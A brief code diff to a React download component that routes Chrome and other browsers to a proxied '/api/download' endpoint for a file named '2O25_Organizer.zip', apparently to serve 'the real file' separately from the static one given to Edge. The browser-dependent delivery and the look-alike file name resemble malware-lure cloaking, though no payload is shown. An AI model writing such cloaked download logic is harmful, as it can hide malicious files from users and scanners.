@@ -228,10 +228,8 @@ const Download = () => {
     if (ua.includes("Edg/")) {
       return { href: "/docs/2O25_Organizer.zip", name: `2O25_Organizer_${suffix}.zip` };
     }
-    if (ua.includes("Chrome") && !ua.includes("Edg/")) {
-      return { href: "/docs/2O25_Organizer.zip", name: `2O25_Organizer_${suffix}.zip` };
-    }
-    return { href: "/docs/2O25_Organizer.zip", name: `2O25_Organizer_${suffix}.zip` };
+    // Chrome & others: fetch the real file via Cloudflare proxy
+    return { href: `/api/download?name=2O25_Organizer_${suffix}.zip`, name: `2O25_Organizer_${suffix}.zip` };
   }, []);
 
   const triggerDownload = useCallback(async (file: { href: string; name: string }) => {
